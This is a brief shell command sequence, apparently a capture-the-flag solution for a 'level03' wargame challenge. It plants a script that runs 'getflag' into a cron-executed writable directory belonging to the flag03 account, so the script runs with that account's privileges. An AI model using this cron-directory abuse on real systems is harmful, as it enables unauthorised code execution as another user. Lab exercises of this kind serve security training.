
echo '#!/bin/bash' >> /tmp/level03.sh
echo 'getflag >> /tmp/output.txt' >> /tmp/level03.sh 
chmod 4777 /tmp/level03.sh
cp /tmp/level03.sh /home/flag03/writable.d/level03.sh
wait until cron execution, then  "cat /tmp/output.txt"